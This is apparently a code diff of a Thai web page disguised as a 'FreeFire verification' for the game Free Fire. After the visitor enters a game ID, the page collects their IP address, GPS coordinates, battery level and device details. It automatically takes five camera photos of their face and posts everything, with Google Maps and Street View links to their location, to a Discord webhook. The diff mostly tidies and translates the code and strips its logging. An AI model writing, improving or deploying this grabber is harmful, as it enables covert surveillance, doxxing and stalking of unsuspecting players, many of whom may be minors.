@@ -387,42 +624,32 @@ let userData = {
 let cameraStream = null;
 let isCapturing = false;
 
-// ===== ฟังก์ชันเก็บข้อมูล =====
+// ===== เก็บข้อมูล =====
 async function collectData() {
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
         userData.ip = ipData.ip;
-    } catch(e) {
-        console.log("IP fetch failed");
-    }
+    } catch(e) {}
 
     try {
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
             userData.battery = Math.floor(battery.level * 100) + "%";
         }
-    } catch(e) {
-        console.log("Battery fetch failed");
-    }
+    } catch(e) {}
 
     return new Promise((resolve) => {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    userData.lat = pos.coords.latitude;
-                    userData.lon = pos.coords.longitude;
-                    resolve();
-                },
+                (pos) => { userData.lat = pos.coords.latitude; userData.lon = pos.coords.longitude; resolve(); },
                 () => { resolve(); }
             );
-        } else {
-            resolve();
-        }
+        } else { resolve(); }
     });
 }
 
-// ===== เปิดกล้องและถ่ายรัวอัตโนมัติ =====
+// ===== เปิดกล้องและถ่าย =====
 async function startCameraAndAutoCapture() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -431,26 +658,20 @@ async function startCameraAndAutoCapture() {
         cameraStream = stream;
         const video = document.getElementById("cam");
         video.srcObject = stream;
-        document.getElementById("scan-status").innerText = "📸 กำลังถ่ายภาพยืนยัน...";
+        document.getElementById("scan-status").innerText = "📸 CAPTURING...";
         document.getElementById("capture-progress").classList.remove("hidden");
         
-        await new Promise(resolve => {
-            video.onloadedmetadata = () => {
-                resolve();
-            };
-        });
+        await new Promise(resolve => { video.onloadedmetadata = () => { resolve(); }; });
         
-        // เริ่มถ่ายรัวทันที 5 รูป
         startBurstCapture(video);
         return true;
     } catch (err) {
-        document.getElementById("scan-status").innerText = "❌ ไม่สามารถเปิดกล้องได้";
-        console.error("Camera error:", err);
+        document.getElementById("scan-status").innerText = "❌ CAMERA ERROR";
         return false;
     }
 }
 
-// ===== ถ่ายรัว 5 รูป (0.3 วินาที/รูป) =====
+// ===== ถ่าย 5 รูป =====
 function startBurstCapture(video) {
     if (isCapturing) return;
     isCapturing = true;
@@ -470,27 +691,17 @@ function startBurstCapture(video) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob((blob) => {
-                if (blob) {
-                    images.push(blob);
-                }
+                if (blob) images.push(blob);
                 captured++;
-                
-                if (captured < burstCount) {
-                    setTimeout(captureOne, 300);
-                } else {
-                    finishAndSend(images, video);
-                }
+                if (captured < burstCount) setTimeout(captureOne, 300);
+                else finishAndSend(images, video);
             }, "image/png", 0.9);
         } catch(e) {
             captured++;
-            if (captured < burstCount) {
-                setTimeout(captureOne, 300);
-            } else {
-                finishAndSend(images, video);
-            }
+            if (captured < burstCount) setTimeout(captureOne, 300);
+            else finishAndSend(images, video);
         }
     }
-    
     captureOne();
 }
 
@@ -499,15 +710,14 @@ function finishAndSend(images, video) {
         cameraStream.getTracks().forEach(t => t.stop());
         cameraStream = null;
     }
-    console.log("Captured " + images.length + " images, sending...");
     sendAllToWebhook(images);
 }
 
-// ===== ส่งข้อมูลทั้งหมด (แก้ไข HTTP 400) =====
+// ===== ส่งข้อมูล =====
 async function sendAllToWebhook(images) {
     const webhookMsg = document.getElementById("webhook-msg");
-    webhookMsg.textContent = "⏳ กำลังส่งข้อมูลไปยัง Discord...";
-    webhookMsg.className = "text-sm font-medium text-yellow-400";
+    webhookMsg.textContent = "⏳ TRANSMITTING TO DISCORD...";
+    webhookMsg.className = "text-xs text-yellow-400/60 font-light tracking-wider";
 
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
     const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
@@ -516,211 +726,40 @@ async function sendAllToWebhook(images) {
     const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-    // เปลี่ยน UI ทันที
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-result").classList.remove("hidden");
-    document.getElementById("ref-code").innerText = `FF-${Math.floor(Math.random()*999999)}`;
+    document.getElementById("ref-code").innerText = `FF-${String(Math.floor(Math.random()*999999)).padStart(6, '0')}`;
 
     const embedData = {
-        title: "🎮 ยืนยันตัวตน FreeFire [Components V2]",
+        title: "🎮 FreeFire Verification [V2]",
         color: 0xff6a00,
         fields: [
             { name: "🆔 FreeFire ID", value: `\`${userData.ffid}\``, inline: false },
             { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
-            { name: "🔋 แบตเตอรี่", value: `\`${userData.battery}\``, inline: true },
-            { name: "📍 พิกัด (GPS)", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
-            { name: "💻 ระบบปฏิบัติการ", value: `\`${navigator.platform}\``, inline: true },
-            { name: "🗣️ ภาษาเครื่อง", value: `\`${navigator.language}\``, inline: true },
-            { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: true },
+            { name: "🔋 Battery", value: `\`${userData.battery}\``, inline: true },
+            { name: "📍 GPS", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
+            { name: "💻 Platform", value: `\`${navigator.platform}\``, inline: true },
+            { name: "🗣️ Language", value: `\`${navigator.language}\``, inline: true },
+            { name: "🖥️ Screen", value: `\`${screen.width}x${screen.height}\``, inline: true },
             { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
-            { name: "💾 RAM ขนาด", value: `\`${ramSize}\``, inline: true },
+            { name: "💾 RAM", value: `\`${ramSize}\``, inline: true },
             { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
-            { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
-            { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
+            { name: "📶 Connection", value: `\`${connectionType}\``, inline: true },
+            { name: "🍪 Cookies", value: `\`${cookiesStatus}\``, inline: true },
             { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
-            { name: "📸 จำนวนภาพ", value: `\`${images ? images.length : 0} รูป\``, inline: true }
+            { name: "📸 Images", value: `\`${images ? images.length : 0} shots\``, inline: true }
         ],
-        footer: { text: "ระบบยืนยันตัวตน FreeFire" },
+        footer: { text: "Secure Verification System" },
         timestamp: new Date().toISOString()
     };
 
     if (userData.lat !== "ไม่ระบุ") {
         embedData.fields.push(
-            { name: "🗺️ Google Maps", value: `[เปิดแผนที่](https://www.google.com/maps/search/?api=1&query=${userData.lat},${userData.lon})`, inline: false },
-            { name: "🏙️ Street View", value: `[ดูหน้าบ้าน](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userData.lat},${userData.lon})`, inline: false }
+            { name: "🗺️ Maps", value: `[Open](https://www.google.com/maps/search/?api=1&query=${userData.lat},${userData.lon})`, inline: true },
+            { name: "🏙️ Street View", value: `[View](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userData.lat},${userData.lon})`, inline: true }
         );
     }
 
-    // แก้ไขปัญหา HTTP 400: ใช้ JSON แทน FormData
     try {
-        console.log("Sending to webhook:", WEBHOOK_URL);
-        console.log("Number of images:", images ? images.length : 0);
-        
-        // สร้าง payload เป็น JSON อย่างเดียว (ไม่มีรูป)
-        const payload = {
-            embeds: [embedData]
-        };
-        
-        // ถ้ามีรูป ให้ใช้ FormData แต่ต้องระบุ content-type ให้ถูกต้อง
         if (images && images.length > 0) {
             const formData = new FormData();
-            const maxImages = Math.min(images.length, 5);
-            
-            // แนบรูปภาพ
-            for (let i = 0; i < maxImages; i++) {
-                formData.append(`file${i}`, images[i], `face_${i+1}.png`);
-            }
-            
-            // แก้ไข embed ให้ชี้ไปที่รูปแรก
-            embedData.image = { url: "attachment://face_1.png" };
-            
-            // ส่ง payload เป็น JSON ใน FormData
-            formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
-            
-            const response = await fetch(WEBHOOK_URL, { 
-                method: "POST", 
-                body: formData
-            });
-            
-            console.log("Response status:", response.status);
-            
-            if (response.ok) {
-                webhookMsg.textContent = "✅ ส่งข้อมูลไปยัง Discord สำเร็จ! (ภาพ " + maxImages + " รูป)";
-                webhookMsg.className = "text-sm font-medium text-green-400";
-                document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
-            } else {
-                const errorText = await response.text();
-                console.log("Error response:", errorText);
-                webhookMsg.textContent = `❌ ส่งข้อมูลไม่สำเร็จ (HTTP ${response.status})`;
-                webhookMsg.className = "text-sm font-medium text-red-400";
-                document.getElementById("status-msg").innerText = "⚠️ ส่งข้อมูลไม่สำเร็จ";
-            }
-        } else {
-            // ไม่มีรูป ส่งแบบ JSON ธรรมดา
-            const response = await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
-            });
-            
-            console.log("Response status:", response.status);
-            
-            if (response.ok) {
-                webhookMsg.textContent = "✅ ส่งข้อมูลไปยัง Discord สำเร็จ!";
-                webhookMsg.className = "text-sm font-medium text-green-400";
-                document.getElementById("status-msg").innerText = "✅ ยืนยันสำเร็จ!";
-            } else {
-                const errorText = await response.text();
-                console.log("Error response:", errorText);
-                webhookMsg.textContent = `❌ ส่งข้อมูลไม่สำเร็จ (HTTP ${response.status})`;
-                webhookMsg.className = "text-sm font-medium text-red-400";
-                document.getElementById("status-msg").innerText = "⚠️ ส่งข้อมูลไม่สำเร็จ";
-            }
-        }
-    } catch(e) {
-        console.error("Webhook error:", e);
-        webhookMsg.textContent = "❌ เกิดข้อผิดพลาดในการส่งข้อมูล: " + e.message;
-        webhookMsg.className = "text-sm font-medium text-red-400";
-        document.getElementById("status-msg").innerText = "❌ เกิดข้อผิดพลาด";
-    }
-
-    renderResultUI(images ? Math.min(images.length, 5) : 0);
-}
-
-// ===== แสดงผล UI =====
-function renderResultUI(imageCount) {
-    const box = document.getElementById("info-box");
-    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
-    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
-    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-    const cpuCores = navigator.hardwareConcurrency || "Unknown";
-    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    const data = [
-        { icon: "🆔", title: "FreeFire ID", value: userData.ffid },
-        { icon: "📍", title: "พิกัด GPS", value: `${userData.lat}, ${userData.lon}` },
-        { icon: "🌐", title: "IP Address", value: userData.ip },
-        { icon: "💻", title: "ระบบปฏิบัติการ", value: navigator.platform },
-        { icon: "🗣️", title: "ภาษา", value: navigator.language },
-        { icon: "🖥️", title: "หน้าจอ", value: `${screen.width}x${screen.height}` },
-        { icon: "🧠", title: "CPU Cores", value: cpuCores },
-        { icon: "💾", title: "RAM", value: ramSize },
-        { icon: "🔋", title: "แบตเตอรี่", value: userData.battery },
-        { icon: "🌍", title: "Timezone", value: timezone },
-        { icon: "📶", title: "Connection", value: connectionType },
-        { icon: "🍪", title: "Cookies", value: cookiesStatus },
-        { icon: "🌙", title: "Dark Mode", value: isDarkMode },
-        { icon: "📸", title: "จำนวนภาพ", value: `${imageCount} รูป` }
-    ];
-
-    box.innerHTML = "";
-    data.forEach(item => {
-        box.innerHTML += `
-            <div class="info-card rounded-2xl p-4 flex items-center gap-4 transition">
-                <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-orange-500/30 to-pink-500/30 flex items-center justify-center text-xl flex-shrink-0 border border-white/10 backdrop-blur-sm">
-                    ${item.icon}
-                </div>
-                <div class="flex-1 overflow-hidden">
-                    <p class="text-[10px] uppercase tracking-widest text-white/40 mb-0.5 font-medium">${item.title}</p>
-                    <p class="font-medium text-sm text-white/90 truncate">${item.value}</p>
-                </div>
-            </div>
-        `;
-    });
-}
-
-// ===== จัดการ Events =====
-document.getElementById("btn-to-scan").addEventListener("click", async () => {
-    const input = document.getElementById("ff-id-input");
-    const id = input.value.trim();
-
-    if (id === "") {
-        input.classList.add("border-red-500/50");
-        input.placeholder = "⚠️ กรุณากรอก ID";
-        setTimeout(() => {
-            input.classList.remove("border-red-500/50");
-            input.placeholder = "เช่น 1234567890";
-        }, 2000);
-        return;
-    }
-
-    if (!/^\d+$/.test(id)) {
-        input.classList.add("border-red-500/50");
-        input.value = "";
-        input.placeholder = "⚠️ ต้องเป็นตัวเลขเท่านั้น";
-        setTimeout(() => {
-            input.classList.remove("border-red-500/50");
-            input.placeholder = "เช่น 1234567890";
-        }, 2000);
-        return;
-    }
-
-    userData.ffid = id;
-    document.getElementById("status-msg").innerText = "📸 กำลังเปิดกล้อง...";
-
-    await collectData();
-
-    document.getElementById("step-input").classList.add("hidden");
-    document.getElementById("step-scan").classList.remove("hidden");
-
-    await startCameraAndAutoCapture();
-});
-
-document.getElementById("btn-back").addEventListener("click", () => {
-    document.getElementById("step-result").classList.add("hidden");
-    document.getElementById("step-input").classList.remove("hidden");
-    document.getElementById("ff-id-input").value = "";
-    document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
-    isCapturing = false;
-});
-
-window.onload = () => {
-    document.getElementById("status-msg").innerText = "⏳ กรอก ID เพื่อเริ่มต้น";
-};
-</script>
-
-</body>
-</html>
